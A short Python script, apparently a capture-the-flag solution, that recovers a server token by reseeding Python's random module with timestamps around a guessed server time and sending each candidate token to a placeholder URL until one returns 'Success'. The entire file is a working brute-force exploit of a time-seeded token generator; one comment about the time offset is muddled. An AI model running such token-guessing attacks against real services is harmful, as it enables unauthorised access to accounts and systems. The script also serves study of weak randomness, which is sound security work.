import time
import random
import requests

def find_correct_seed(server_url, target_time, time_window):
    successful_seeds = []
    
    for offset in range(-time_window, time_window + 1):
        seed = target_time + offset
        random.seed(seed)
        
        potential_token = random.randint(1000000000000000, 9999999999999999)
        
        request_url = f"{server_url}?token={potential_token}"
        
        response = requests.get(request_url)
        if "Success" in response.text:
            print(f"Successful response with token: {potential_token} from seed: {seed}")
            successful_seeds.append(seed)
            break  # Stop if a successful seed is found
    else:
        print("No valid seed found in the given time window.")

server_url = "https://example.com/web01/"
# Calculate the difference in seconds (2 hours behind, considering day difference makes it 22 hours ahead in terms of seconds)
time_difference = -2 * 3600
# Current local time in UTC
current_utc_time = time.time()
target_time = current_utc_time + time_difference
time_window = 60 # 1 min to catch the server's update on the new seed generation

find_correct_seed(server_url, target_time, time_window)
